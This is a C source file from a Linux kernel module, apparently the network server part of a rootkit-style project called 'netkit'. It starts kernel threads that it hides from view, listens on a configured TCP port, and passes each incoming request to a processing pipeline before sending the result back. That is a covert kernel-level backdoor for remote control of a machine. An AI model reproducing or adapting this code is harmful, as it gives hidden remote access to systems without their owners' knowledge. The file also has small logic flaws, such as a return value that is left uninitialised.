#include <linux/types.h>
#include <linux/kthread.h>
#include <linux/freezer.h>
#include <linux/sched.h>
#include <linux/errno.h>
#include <linux/random.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/net.h>
#include <linux/delay.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/tcp.h>

#include "server.h"

#include "../../netkit.h"
#include "../../cmd/iface.h"
#include "../../sys/mem.h"
#include "../../sys/socket.h"
#include "../../sys/debug.h"
#include "../../sys/symbol.h"
#include "../../sys/task.h"
#include "../../sys/lock.h"

static struct task_struct *task_conn_loop;

static int server_conn_handler(void *args)
{
    struct server_conn *packet = (struct server_conn*)args;
    u8* res_buf = NULL;
    size_t res_buflen = 0;
    int retv;

    NETKIT_LOG("[*] calling io_process (req_buflen: %lu)...\n", packet->req_buflen);
    retv = io_process(SERVER_PIPELINE_OPS_ARR, packet->req_buf, packet->req_buflen, &res_buf, &res_buflen);

    // if io_process failed, do not write to socket
    if (res_buflen == 0)
        goto LAB_REL_SOCK_NO_BUF;

    if (retv < 0)
        goto LAB_REL_SOCK;
    
    NETKIT_LOG("[*] writing %lu bytes...\n", res_buflen);
    retv = socket_write(packet->client_sk, res_buf, res_buflen);

LAB_REL_SOCK:
    kzfree(res_buf, res_buflen);
LAB_REL_SOCK_NO_BUF:
    sock_release(packet->client_sk);
    kzfree(packet, sizeof(*packet));
    
    netkit_workers_decr();
    
    return retv;
}

/**
 * Listens to connections, parses the packet and starts packet processing
 */
static int server_conn_loop(void* args)
{
    //char kthread_name[29];  // strlen("netkit-conn-handler-") + 8 + 1
    unsigned int kthread_name_id;
    struct task_struct *conn_task;
    struct socket *server_sk;
    struct sockaddr_in *server_addr;
    struct socket *client_sk;
    struct server_conn *conn_data;
    int retv;

    netkit_workers_incr();

    retv = socket_create(inet_addr(CONFIG_IO_SERVER_IP), htons(CONFIG_IO_SERVER_PORT), &server_sk, &server_addr);
    if (retv < 0)
    {
        NETKIT_LOG("[!] failed to get socket (err: %d)\n", retv);
        goto LAB_OUT_NO_SOCK;
    }

    retv = socket_listen(server_sk, server_addr);
    if (retv < 0)
    {
        NETKIT_LOG("[!] failed to listen (err: %d)\n", retv);
        goto LAB_OUT;
    }

    NETKIT_LOG("[+] started listening for connections\n");
    
    while (likely(!kthread_should_stop()))
    {
        // conn polling needs to be optimized for speed, to make overhead minimal
        NETKIT_LOG("[*] checking for connection...\n");

        if (unlikely(try_to_freeze()))
			continue;

        // use non-blocking socket to be able to respond to kthread_should_stop() and properly clean sockets
        retv = kernel_accept(server_sk, &client_sk, SOCK_NONBLOCK);
        if (likely(retv < 0))
            goto LAB_CONN_REITER;

        NETKIT_LOG("[+] received connection\n");

        // populate conn_data instance
        conn_data = kzmalloc(sizeof(*conn_data), GFP_KERNEL);
        if (IS_ERR(conn_data))
            goto LAB_CONN_ERR_NO_CONN;

        // try to read conn_data content
        conn_data->client_sk = client_sk;
        retv = socket_read(conn_data->client_sk, &conn_data->req_buf, &conn_data->req_buflen);
        if (retv < 0)
            goto LAB_CONN_ERR;

        if (conn_data->req_buflen == 0)
        {
            NETKIT_LOG("[!] got 0 bytes from connection. giving no reply\n");
            goto LAB_CONN_ERR;
        }

        // start kthread
        kthread_name_id = (int)get_random_long();

        NETKIT_LOG("[*] starting conn handler...\n");

        // child should free conn_data
        conn_task = KTHREAD_RUN_HIDDEN(server_conn_handler, conn_data, CONFIG_IO_SERVER_KTHR_HANDLER_NAME, kthread_name_id);
        if (IS_ERR(conn_task))
            goto LAB_CONN_ERR;

LAB_CONN_REITER:
        schedule_timeout_interruptible(HZ / 10);  // 100ms check rate
        continue;

LAB_CONN_ERR:
        if (conn_data->req_buf)
            kzfree(conn_data->req_buf, conn_data->req_buflen);

        kzfree(conn_data, sizeof(*conn_data));
        conn_data = NULL;
LAB_CONN_ERR_NO_CONN:
        sock_release(client_sk);
        client_sk = NULL;
        goto LAB_CONN_REITER;
    }

    NETKIT_LOG("[*] conn loop received kthread_stop...\n");
LAB_OUT:
    NETKIT_LOG("[*] stopping conn loop...\n");
    sock_release(server_sk);

LAB_OUT_NO_SOCK:
    NETKIT_LOG("[*] quitting conn loop...\n");

    netkit_workers_decr();

    return retv;
}

/**
 * Initializes the kthread for the server
 * Return: 0 if successful
 */
int server_init(void)
{
    NETKIT_LOG("[*] starting server_conn_loop...\n");

    task_conn_loop = KTHREAD_RUN_HIDDEN(server_conn_loop, NULL, CONFIG_IO_SERVER_KTHR_LOOP_NAME);
    if (IS_ERR(task_conn_loop))
    {
        task_conn_loop = NULL;
        return PTR_ERR(task_conn_loop);
    }

    return 0;
}

int server_exit(void)
{
    int retv;

    NETKIT_LOG("[*] trying to shutdown IO server...\n");
    if (!task_conn_loop)
    {
        NETKIT_LOG("[!] task loop does not exist when exiting\n");
        return -ECHILD;
    }

    // don't stop thread when errored (i.e. because of sockets)
    if (TASK_STATE(task_conn_loop) & (TASK_RUNNING | TASK_INTERRUPTIBLE | TASK_UNINTERRUPTIBLE))
    {
        NETKIT_LOG("[*] stopping conn loop...\n");
        retv = kthread_stop(task_conn_loop);
        if (retv < 0)
            NETKIT_LOG("[!] kthread stop returned error\n");
    } else {
        NETKIT_LOG("[-] conn loop is not running\n");
    }

    // block until all kthreads (including conn loop) are handled
    // use 1 since kref_init sets the counter to 1
    // drawback: if any conn handler crashes, this will wait infinitely
    //wait_event(all_conns_handled_wait_queue, kref_read(&active_conns) == 1);

    NETKIT_LOG("[+] all connections are closed\n");

    return retv;
}